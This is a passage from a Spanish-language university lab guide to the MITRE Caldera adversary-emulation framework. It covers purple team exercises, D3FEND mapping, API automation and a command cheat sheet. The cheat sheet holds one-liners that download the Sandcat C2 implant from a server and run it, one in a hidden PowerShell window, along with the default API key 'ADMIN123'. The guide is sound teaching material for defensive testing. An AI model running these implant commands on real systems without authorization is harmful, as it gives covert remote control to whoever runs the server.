Para cada técnica ATT&CK, identificar contramedidas D3FEND:

| ATT&CK Técnica                 | Contramedida D3FEND                     | Implementación                               |
| ------------------------------ | --------------------------------------- | -------------------------------------------- |
| T1018 (Network Discovery)      | D3-NTA (Network Traffic Analysis)       | Detectar escaneos ARP anómalos               |
| T1552.004 (SSH Keys)           | D3-FA (File Access Analysis)            | Alertar acceso a `.ssh/` por procesos no SSH |
| T1552.003 (Bash History)       | D3-CSPP (Credential Storage Protection) | Proteger `.bash_history` con permisos        |
| T1005 (Data from Local System) | D3-DNAC (Data Access Control)           | DLP para detectar lectura masiva de archivos |

### Ejercicio Purple Team colaborativo

#### Fase 1: Red Team ejecuta operación

1. Ejecutar operación `Lab3-DataTheft-Simulation`
2. Documentar timestamp de inicio
3. NO informar a Blue Team sobre timing exacto

#### Fase 2: Blue Team busca evidencia

1. Analizar logs del período (ejemplo: 10:00 AM - 11:00 AM)
2. Buscar indicadores de descubrimiento, credential access, collection
3. Documentar hallazgos:
   - ¿Qué técnicas fueron detectadas?
   - ¿Cuáles pasaron desapercibidas?
   - ¿Cuánto tiempo tardó la detección?

#### Fase 3: Debriefing conjunto

Comparar:

| Técnica                | Ejecutada por Red | Detectada por Blue      | Gap                    |
| ---------------------- | ----------------- | ----------------------- | ---------------------- |
| T1018 ARP Scan         | ✓ 10:01:15        | ✓ 10:01:30 (15s delay)  | Alertado correctamente |
| T1082 System Info      | ✓ 10:01:20        | ✗ No detectado          | Falta regla            |
| T1552.004 SSH Keys     | ✓ 10:02:00        | ✓ 10:05:00 (3min delay) | Delay excesivo         |
| T1552.003 Bash History | ✓ 10:02:15        | ✗ No detectado          | Falta monitoreo        |

#### Fase 4: Mejora iterativa

1. **Blue Team crea reglas** para técnicas no detectadas
2. **Red Team re-ejecuta operación** con ofuscación
3. **Validar mejoras** en detección

### Plugin GameBoard para Purple Team

El plugin **GameBoard** visualiza operaciones desde ambas perspectivas simultáneamente.

#### Características de GameBoard

1. **Vista dividida**:
   - Panel izquierdo: Acciones del Red Team
   - Panel derecho: Detecciones del Blue Team

2. **Sincronización temporal**:
   - Timeline compartida
   - Correlación de eventos

3. **Scoring**:
   - Puntos para Red Team por técnicas exitosas
   - Puntos para Blue Team por detecciones

### Automatización de Purple Team con API

Caldera proporciona API REST para automatización:

#### Ejemplo: Ejecutar operación vía API

```bash
# Crear operación
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "AutomatedPurpleTeam-Exercise",
    "adversary": {"adversary_id": "de07f52d-9928-4071-9142-cb1d3bd851e8"},
    "group": "red",
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "state": "running",
    "autonomous": 1
  }'

# Obtener resultados
curl -X GET http://localhost:8888/api/v2/operations/OPERATION_ID/report \
  -H "KEY: ADMIN123" > operation_report.json
```

#### Integración con pipeline de CI/CD

```yaml
# .gitlab-ci.yml
purple_team_validation:
  stage: security_testing
  script:
    - ./deploy_caldera_agent.sh
    - ./run_purple_team_operation.sh
    - python3 validate_detections.py
    - python3 generate_coverage_report.py
  artifacts:
    reports:
      coverage_report: att&ck_coverage.json
```

### Métricas de madurez Purple Team

| Nivel                     | Descripción                            | Características                                        |
| ------------------------- | -------------------------------------- | ------------------------------------------------------ |
| **Nivel 1: Ad-hoc**       | Ejercicios no planificados             | - Sin documentación formal<br>- Sin repetibilidad      |
| **Nivel 2: Documentado**  | Ejercicios planificados y documentados | - Runbooks para operaciones<br>- Reportes básicos      |
| **Nivel 3: Automatizado** | Integración CI/CD                      | - Operaciones automatizadas<br>- Métricas de cobertura |
| **Nivel 4: Continuo**     | Validación continua                    | - Ejecución regular<br>- Dashboard de cobertura ATT&CK |
| **Nivel 5: Optimizado**   | Mejora basada en datos                 | - Análisis de tendencias<br>- Optimización de reglas   |

### Resultado esperado de perspectiva Purple Team

Al finalizar esta sección, el estudiante comprenderá:

✓ Cómo analizar resultados desde perspectiva Red Team
✓ Cómo correlacionar actividad con telemetría Blue Team
✓ Desarrollo de reglas de detección basadas en operaciones Caldera
✓ Métricas para evaluar gaps de detección
✓ Uso de ejercicios Purple Team para mejora continua
✓ Automatización de validación de seguridad

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">9. Referencia rápida y recursos adicionales</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Cheat Sheet de comandos

#### Instalación y gestión de Caldera

```bash
# Clonar repositorio
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Crear entorno virtual
python3 -m venv .calderavenv
source .calderavenv/bin/activate

# Instalar dependencias
pip3 install -r requirements.txt

# Iniciar servidor (primera vez)
python3 server.py --insecure --build

# Iniciar servidor (subsiguiente)
python3 server.py --insecure

# Iniciar con plugins específicos
python3 server.py --insecure -P sandcat,stockpile,emu

# Modo debug
python3 server.py --insecure --log DEBUG

# Reset completo (eliminar datos)
python3 server.py --insecure --fresh
```

#### Docker

```bash
# Ejecutar imagen oficial
docker run -p 8888:8888 ghcr.io/mitre/caldera:latest

# Construir imagen local
docker build --build-arg VARIANT=full -t caldera .
docker run -it -p 8888:8888 caldera

# Con persistencia de datos
docker run -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest

# Con configuración personalizada
docker run -p 8888:8888 \
  -v $(pwd)/mi-config.yml:/usr/src/app/conf/local.yml \
  ghcr.io/mitre/caldera:latest
```

#### Despliegue de agentes

```bash
# Linux
server="http://192.168.1.100:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  -H "server:$server" -H "group:red" \
  $server/file/download > sandcat && \
chmod +x sandcat && \
./sandcat -server $server -group red -v

# Linux (background)
nohup ./sandcat -server $server -group red > /dev/null 2>&1 &

# macOS
curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" \
  -H "server:$server" -H "group:red" \
  $server/file/download > sandcat-darwin && \
chmod +x sandcat-darwin && \
./sandcat-darwin -server $server -group red
```

```powershell
# Windows PowerShell
$server="http://192.168.1.100:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$output="C:\Users\Public\sandcat.exe"
$wc.DownloadFile($url,$output)
Start-Process -FilePath $output -ArgumentList "-server $server" -WindowStyle hidden
```

#### API REST

```bash
# API Key por defecto (modo insecure)
API_KEY="ADMIN123"
SERVER="http://localhost:8888"

# Listar adversarios
curl -X GET $SERVER/api/v2/adversaries -H "KEY: $API_KEY"

# Listar operaciones
curl -X GET $SERVER/api/v2/operations -H "KEY: $API_KEY"

# Crear operación
curl -X POST $SERVER/api/v2/operations \
  -H "KEY: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "API-Operation",
    "adversary": {"adversary_id": "de07f52d-9928-4071-9142-cb1d3bd851e8"},
    "group": "red",
    "state": "running",
    "autonomous": 1
  }'

# Obtener reporte de operación
curl -X GET $SERVER/api/v2/operations/OPERATION_ID/report \
  -H "KEY: $API_KEY" > report.json

# Listar agentes
curl -X GET $SERVER/api/v2/agents -H "KEY: $API_KEY"

# Matar agente
curl -X DELETE $SERVER/api/v2/agents/PAW_ID -H "KEY: $API_KEY"
```

### Rutas de archivos importantes

```bash
# Configuración
/conf/default.yml              # Configuración por defecto (insecure)
/conf/local.yml                # Configuración de producción
/conf/agents.yml               # Configuración de agentes
/conf/payloads.yml             # Definición de payloads

# Datos de usuario
/data/adversaries/             # Adversarios personalizados
/data/abilities/               # Habilidades personalizadas
/data/sources/                 # Fuentes de facts personalizadas
/data/planners/                # Planificadores personalizados
/data/results/                 # Resultados de operaciones

# Plugins
/plugins/sandcat/              # Agente Sandcat
/plugins/stockpile/            # Habilidades y adversarios estándar
/plugins/emu/                  # Emulación de adversarios reales
/plugins/atomic/               # Atomic Red Team

# Stockpile (incluido con Caldera)
/plugins/stockpile/data/abilities/       # 162 habilidades
/plugins/stockpile/data/adversaries/     # Adversarios pre-construidos

# Logs
/data/results/                 # Resultados de operaciones
/logs/                         # Logs del servidor (si configurado)
```

### Puertos de red

| Puerto | Protocolo | Uso                    | Configuración                   |
| ------ | --------- | ---------------------- | ------------------------------- |
| 8888   | HTTP      | Interfaz web y C2 HTTP | `conf/default.yml: port`        |
| 8443   | HTTPS     | Interfaz web segura    | Plugin SSL requerido            |
| 7010   | TCP       | Canal C2 TCP           | `app.contact.tcp`               |
| 7011   | UDP       | Canal C2 UDP           | `app.contact.udp`               |
| 7012   | WebSocket | Canal C2 WebSocket     | `app.contact.websocket`         |
| 8853   | DNS       | Túnel DNS C2           | `app.contact.dns.socket`        |
| 2222   | FTP       | Canal C2 FTP           | `app.contact.ftp.port`          |
| 8022   | SSH       | Túnel SSH              | `app.contact.tunnel.ssh.socket` |

### Tácticas y técnicas ATT&CK cubiertas

#### Distribución de habilidades por táctica

| Táctica                  | Ejemplo de técnicas           | Habilidades disponibles                          |
| ------------------------ | ----------------------------- | ------------------------------------------------ |
| **Reconnaissance**       | T1595, T1592                  | Limitadas (enfoque post-compromise)              |
| **Resource Development** | T1583, T1586                  | No aplicable (infraestructura C2 ya establecida) |
| **Initial Access**       | T1566, T1190                  | Plugin Access                                    |
| **Execution**            | T1059 (PowerShell, Bash, Cmd) | ~25 habilidades                                  |
| **Persistence**          | T1053, T1547                  | ~10 habilidades                                  |
| **Privilege Escalation** | T1055, T1068                  | ~15 habilidades                                  |
| **Defense Evasion**      | T1070, T1027, T1562           | ~20 habilidades                                  |
| **Credential Access**    | T1003, T1552, T1555           | ~18 habilidades                                  |
| **Discovery**            | T1082, T1018, T1016           | ~30 habilidades                                  |
| **Lateral Movement**     | T1021 (SMB, RDP, SSH)         | ~12 habilidades                                  |
| **Collection**           | T1005, T1074, T1113           | ~15 habilidades                                  |
| **Command and Control**  | T1071, T1095, T1573           | Implícito en agentes                             |
| **Exfiltration**         | T1041, T1048, T1567           | ~8 habilidades                                   |
| **Impact**               | T1485, T1486, T1490           | ~9 habilidades                                   |

**Total**: 162 habilidades en Stockpile + adicionales en Emu y Atomic

### Adversarios reales disponibles (Plugin EMU)

| Grupo APT         | Nombre alternativo   | Objetivo típico           | Técnicas destacadas                    |
| ----------------- | -------------------- | ------------------------- | -------------------------------------- |
| **APT29**         | Cozy Bear, The Dukes | Gobiernos, think tanks    | Spearphishing, WMI, PowerShell         |
| **Carbanak**      | FIN7 (relacionado)   | Instituciones financieras | Point-of-sale malware, ATM jackpotting |
| **FIN6**          | -                    | Retail, hospitality       | Tarjetas de pago, POS scraping         |
| **FIN7**          | Carbanak (overlap)   | Retail, restaurants       | Phishing, Carbanak backdoor            |
| **Menu Pass**     | APT10, Stone Panda   | MSPs, telecomunicaciones  | Cloud hopper, RATs, DLL side-loading   |
| **Wizard Spider** | -                    | Empresas globales         | Trickbot, Ryuk ransomware              |
| **OilRig**        | APT34, Helix Kitten  | Medio Oriente, energía    | DNS tunneling, webshells               |

### Troubleshooting común

#### Problema: Agente no se conecta

```bash
# Verificar conectividad
ping CALDERA_SERVER_IP
telnet CALDERA_SERVER_IP 8888

# Verificar servidor Caldera está escuchando
netstat -tuln | grep 8888

# Verificar firewall
sudo ufw status
sudo iptables -L -n

# Verificar logs del agente (si ejecutado con -v)
./sandcat -server http://SERVER:8888 -group red -v
```

#### Problema: Habilidad falla en ejecución

1. **Verificar executor**: ¿El agente tiene el executor requerido?
   - Windows: `psh`, `cmd`, `pwsh`
   - Linux: `sh`, `bash`

2. **Verificar privilegios**: ¿La habilidad requiere privilegios elevados?

3. **Verificar dependencias de facts**: ¿Falta un fact requerido?
   - Revisar comando para placeholders `#{fact.name}`

4. **Verificar plataforma**: ¿Habilidad compatible con OS del agente?

#### Problema: Operación se queda en "running" pero no progresa

1. **Verificar estado de agentes**: ¿Agentes están "alive"?
2. **Revisar sleep interval**: Agentes con sleep alto tardan más
3. **Verificar dependencias**: ¿Alguna habilidad requiere fact no disponible?
4. **Ver logs del servidor**: `python3 server.py --log DEBUG`

#### Problema: Docker no persiste datos

```bash
# Crear volumen antes de ejecutar
docker volume create caldera-data

# Montar volumen en /usr/src/app/data
docker run -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest
```

### Recursos adicionales

#### Documentación oficial

- **Documentación Caldera**: [https://caldera.readthedocs.io](https://caldera.readthedocs.io)
- **Repositorio GitHub**: [https://github.com/mitre/caldera](https://github.com/mitre/caldera)
- **MITRE ATT&CK**: [https://attack.mitre.org](https://attack.mitre.org)
- **MITRE D3FEND**: [https://d3fend.mitre.org](https://d3fend.mitre.org)

#### Videos y tutoriales

- **Canal YouTube de Caldera**: [Playlist oficial](https://www.youtube.com/playlist?list=PLF2bj1pw7-ZvLTjIwSaTXNLN2D2yx-wXH)
- **MITRE ATT&CK Training**: [attack.mitre.org/resources/training](https://attack.mitre.org/resources/training)

#### Comunidad y soporte

- **GitHub Issues**: [github.com/mitre/caldera/issues](https://github.com/mitre/caldera/issues)
- **Slack Workspace**: Disponible para colaboradores

#### Herramientas complementarias

| Herramienta          | Propósito                       | URL                                                                                        |
| -------------------- | ------------------------------- | ------------------------------------------------------------------------------------------ |
| **ATT&CK Navigator** | Visualizar cobertura ATT&CK     | [mitre-attack.github.io/attack-navigator](https://mitre-attack.github.io/attack-navigator) |
| **Atomic Red Team**  | Tests atómicos de ATT&CK        | [github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team)   |
| **Sigma**            | Reglas de detección genéricas   | [github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)                               |
| **Detection Lab**    | Lab automatizado para detección | [github.com/clong/DetectionLab](https://github.com/clong/DetectionLab)                     |
| **VECTR**            | Gestión de Purple Team          | [vectr.io](https://vectr.io)                                                               |

#### Cursos y certificaciones

- **Caldera Training Plugin**: Curso de certificación integrado en Caldera (acceder vía Plugins → Training)
- **MITRE ATT&CK Defender (MAD)**: Certificación oficial de MITRE sobre ATT&CK
- **SANS SEC555**: SIEM Implementation and Advanced Threat Detection
- **SANS SEC599**: Defeating Advanced Adversaries - Purple Team Tactics & Kill Chain Defenses

### Próximos pasos sugeridos

#### Para profundizar conocimiento

1. **Explorar plugin EMU**:
   - Ejecutar emulación de APT29
   - Comparar TTPs con reporte CTID original
   - Validar detecciones contra adversario real

2. **Crear habilidad personalizada**:
   - Escribir YAML de habilidad nueva
   - Agregar parser para extraer facts
   - Incluir comando de cleanup

3. **Desarrollar plugin custom**:
   - Estudiar arquitectura de plugins
   - Crear plugin simple (ejemplo: integración con API externa)
   - Documentar en repositorio personal

4. **Integración con SIEM**:
   - Configurar forwarding de logs (Sysmon, auditd)
   - Crear dashboard de operaciones Caldera
   - Correlacionar eventos con operaciones conocidas

#### Para aplicación práctica

1. **Implementar programa Purple Team**:
   - Definir calendario de ejercicios mensuales
   - Crear adversarios basados en threat intelligence de la organización
   - Medir mejora en tasa de detección trimestral

2. **Validación de controles de seguridad**:
   - Mapear controles actuales a ATT&CK
   - Ejecutar operaciones Caldera para validar gaps
   - Priorizar implementación de controles faltantes

3. **Automatización de validación**:
   - Integrar Caldera en pipeline CI/CD
   - Ejecutar operaciones básicas en cada deployment
   - Generar métricas de cobertura ATT&CK automáticas

### Glosario de términos

| Término         | Definición                                                                 |
| --------------- | -------------------------------------------------------------------------- |
| **Ability**     | Técnica individual de ATT&CK ejecutable en Caldera                         |
| **Adversary**   | Perfil de ataque que define secuencia de habilidades                       |
| **Agent**       | Implante C2 desplegado en sistema objetivo                                 |
| **APT**         | Advanced Persistent Threat - Adversario sofisticado y persistente          |
| **Beacon**      | Comunicación periódica del agente con servidor C2                          |
| **C2**          | Command and Control - Infraestructura de control de implantes              |
| **CTID**        | Cyber Threat Intelligence - Planes de emulación de MITRE                   |
| **Executor**    | Intérprete de comandos (PowerShell, Bash, CMD)                             |
| **Fact**        | Dato descubierto durante operación reutilizable en habilidades posteriores |
| **Jitter**      | Aleatorización de timing para evasión de detección                         |
| **Link**        | Instancia de ejecución de una habilidad                                    |
| **Operation**   | Campaña de ataque en vivo ejecutando adversario                            |
| **PAW**         | Identificador único del agente (Paw print)                                 |
| **Planner**     | Lógica de ejecución de habilidades en operación                            |
| **Purple Team** | Colaboración entre Red Team y Blue Team                                    |
| **Source**      | Conocimiento inicial (facts) sobre objetivo                                |
| **TTPs**        | Tactics, Techniques, and Procedures - Métodos de adversarios               |

### Consideraciones éticas y legales

> ⚠️ **ADVERTENCIA LEGAL**
>
> El uso de Caldera y herramientas de emulación de adversarios debe realizarse exclusivamente en:
>
> 1. **Entornos controlados de laboratorio**
> 2. **Sistemas propios o con autorización explícita por escrito**
> 3. **Redes aisladas sin conexión a sistemas de producción**
>
> El uso no autorizado de estas técnicas en sistemas que no se poseen constituye **actividad ilegal** en la mayoría de jurisdicciones y puede resultar en:
> - Sanciones penales
> - Demandas civiles
> - Pérdida de certificaciones profesionales
>
> **SIEMPRE** obtener autorización por escrito antes de ejecutar operaciones de emulación de adversarios en entornos no propios.

### Conclusión

Caldera Framework es una herramienta poderosa para:

✓ Educación en ciberseguridad basada en ATT&CK
✓ Validación de controles de seguridad
✓ Ejercicios de Purple Team reproducibles
✓ Desarrollo de reglas de detección
✓ Automatización de emulación de adversarios

Este documento ha cubierto los fundamentos necesarios para instalar, configurar y utilizar Caldera en entornos educativos, con enfoque en laboratorios prácticos que permiten comprender tanto la perspectiva ofensiva (Red Team) como la defensiva (Blue Team).

La combinación de teoría, práctica y reflexión Purple Team proporciona una base sólida para continuar explorando la emulación de adversarios y mejorar la postura de seguridad mediante validación continua.

---

**Fecha de última actualización**: 22 de noviembre de 2025
**Versión de Caldera**: 5.3.0
**Autor**: Laboratorio de Ciberseguridad - UNTELS

<hr style="border: none; height: 10px; background-color: #003b00;" />
